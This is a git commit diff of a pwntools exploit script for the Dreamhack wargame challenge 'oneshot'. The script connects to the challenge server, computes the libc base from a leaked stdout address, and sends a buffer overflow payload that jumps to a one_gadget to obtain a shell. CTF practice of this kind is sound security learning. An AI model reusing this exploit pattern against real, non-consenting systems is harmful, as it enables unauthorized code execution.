1e0577eaf4b12eefd2bc54b345f5c2623129de7d
Minjea Lee <gabe0529@naver.com>
2022-04-08 19:42:27 +0900

    dreamhavk wargame oneshot

--- dreamhack/oneshot/ex_oneshot.py
+++ dreamhack/oneshot/ex_oneshot.py
@@ -1,26 +1,36 @@
 from pwn import *
 
-p = process("./oneshot")
-libc = ELF("./libc.so.6")
+# p = process("./oneshot")
+# nc host1.dreamhack.games 23506
+p = remote("host1.dreamhack.games", 23506)
 
+libc = ELF("./libc.so.6")
+# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
+
+# one_offset = [0x45226, 0x4527a, 0xf03a4, 0xf1247] # /lib/x86_64-linux-gnu/libc-2.23.so
 one_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
 
-pie_base = p.libs()['/home/leeminjea/Desktop/sf/dreamhack/oneshot/oneshot']
+# pie_base = p.libs()['/home/leeminjea/Desktop/sf/dreamhack/oneshot/oneshot']
 
 p.recvuntil("stdout: ")
 
 stdout = int(p.recv(14), 16)
-libc.address = pie_base + stdout - libc.symbols["_IO_2_1_stdout_"]
+libc.address = stdout - libc.symbols["_IO_2_1_stdout_"] #+ pie_base
 one_gadget = libc.address + one_offset[0]
+
+log.info("stdout: " + hex(stdout))
+log.info("libc.address: " + hex(libc.address))
 
 pay = b""
 pay += b"A" * (0x20 - 0x8)
 pay += p64(0)
 pay += b"B" * 0x8
 pay += p64(one_gadget)
+# pay += b"X" * 0x8
 
+input()
 
-
+p.sendafter("MSG: ", pay)
 
 
 p.interactive()
